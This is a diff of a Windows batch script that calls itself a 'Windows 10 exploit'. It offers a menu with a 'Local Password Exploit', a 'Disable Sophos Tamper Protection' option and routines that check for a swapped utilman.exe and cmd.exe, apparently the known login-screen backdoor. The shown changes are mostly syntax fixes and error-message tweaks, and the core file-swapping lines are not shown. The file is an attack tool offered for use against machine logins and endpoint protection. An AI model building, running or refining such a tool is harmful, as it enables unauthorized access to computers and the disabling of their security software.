@@ -34,7 +34,7 @@ echo ^|==================================^|
 echo ^|  WINDOWS 10  EXPLOIT BY S1rDyn0  ^|
 echo ^|   ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~    ^| 
 echo ^|                                  ^|
-echo ^|  BUILD ^| Production      23.5.8  ^|
+echo ^|  BUILD ^| Production    23.5.10  ^|
 echo ^|==================================^| & echo: & echo:
 echo ^[1^] Local Password Exploit
 echo ^[2^] Disable Sophos Tamper Protection
@@ -49,51 +49,53 @@ set validOptions=0 1 2 3 4 5 6
 set /p "crackType=^>"
 
 set optionFound=false
-for %%a in (%validOptions%) do (
-  if "%crackType%"=="%%a" (
+for %%a in (!validOptions!) do (
+  if "!crackType!"=="%%a" (
     set optionFound=true
   )
 )
 
-if not %optionFound%==true (
+if not !optionFound!==true (
   color 0C
+  cls
   call :showDinoError
-  echo Looks like that's an invalid option!
-  timeout /t 5 > nul
+  echo Looks like that^'s an invalid option^!
+  timeout /t 5 
   goto menu
 )
 
-if "%crackType%" EQU "0" (
+if "!crackType!" EQU "0" (
   color 07
   cls & echo Exiting...
-  exit /b 1
+  exit 
 )
 
-if "%crackType%" EQU "1" (
+if "!crackType!" EQU "1" (
   call :exploit1
 )
 
-if "%crackType%" EQU "2" (
+if "!crackType!" EQU "2" (
   call :exploit2
 )
 
-if "%crackType%" EQU "3" (
+if "!crackType!" EQU "3" (
   call :exploit3
 )
 
-if "%crackType%" EQU "4" (
-  start "" "C:/windows/system32/osk.exe"
+if "!crackType!" EQU "4" (
+  start "" "C:\windows\system32\osk.exe"
+  goto :menu
 )
 
-if "%crackType%" EQU "5" (
+if "!crackType!" EQU "5" (
   call :exploit5
 )
 
-if "%crackType%" EQU "6" (
+if "!crackType!" EQU "6" (
   call :exploit6
 )
 
-goto menu
+goto :menu
 
 
 :exploit1
@@ -121,7 +123,7 @@ if exist "c:\windows\system32" (
   call :showDinoError
   echo Could not find System Directory... & echo:
   echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 
@@ -145,7 +147,7 @@ if exist "c:\windows\system32\drivers" (
   call :showDinoError
   echo Could not find System Directory... & echo:
   echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 
@@ -169,7 +171,7 @@ if exist "c:\windows\system32" (
 
     color 0A
     echo -----------------------------------
-    echo Exploit Completed | No errors
+    echo Exploit Completed ^| No errors
     pause
     goto menu
 
@@ -178,7 +180,7 @@ if exist "c:\windows\system32" (
     call :showDinoError
     echo Could not find System Directory... & echo:
     echo Failing Exploit and returning to menu
-    timeout /t 5 > nul
+    timeout /t 5 
     goto menu
   )
 
@@ -187,7 +189,7 @@ if exist "c:\windows\system32" (
   call :showDinoError
   echo Could not find System Directory... & echo:
   echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 
@@ -200,7 +202,7 @@ if exist "c:\windows\system32" (
   color 0C
   call :showDinoError
   echo Could not find System Folder... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 if exist "c:\windows\system32\utilman.old" (
@@ -209,7 +211,7 @@ if exist "c:\windows\system32\utilman.old" (
   color 0C
   call :showDinoError
   echo Could not find utilman.old... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 if exist "c:\windows\system32\cmd.exe" (
@@ -218,7 +220,7 @@ if exist "c:\windows\system32\cmd.exe" (
   color 0C
   call :showDinoError
   echo Could not find cmd.exe... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 if exist "c:\windows\system32\utilman.exe" (
@@ -227,7 +229,7 @@ if exist "c:\windows\system32\utilman.exe" (
   color 0C
   call :showDinoError
   echo Could not find exploited utilman... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 
@@ -252,7 +254,7 @@ if exist "x:\sources\restore" (
   color 0C
   call :showDinoError
   echo Could not find Restore Folder... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 if exist "x:\sources\restore\cmd.exe" (
@@ -261,7 +263,7 @@ if exist "x:\sources\restore\cmd.exe" (
   color 0C
   call :showDinoError
   echo Could not find Command Prompt backup... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 if exist "x:\sources\restore\utilman.exe" (
@@ -270,7 +272,7 @@ if exist "x:\sources\restore\utilman.exe" (
   color 0C
   call :showDinoError
   echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu
-  timeout /t 5 > nul
+  timeout /t 5 
   goto menu
 )
 
@@ -300,5 +302,5 @@ echo               / _^)
 echo      _.----._/ /
 echo     /         /
 echo  __/ ^(  ^| ^(  ^|
-echo /__.-'^|_^|--^|_^|
+echo /__.-^'^|_^|--^|_^|
 echo EXPLOIT ERROR... & echo:
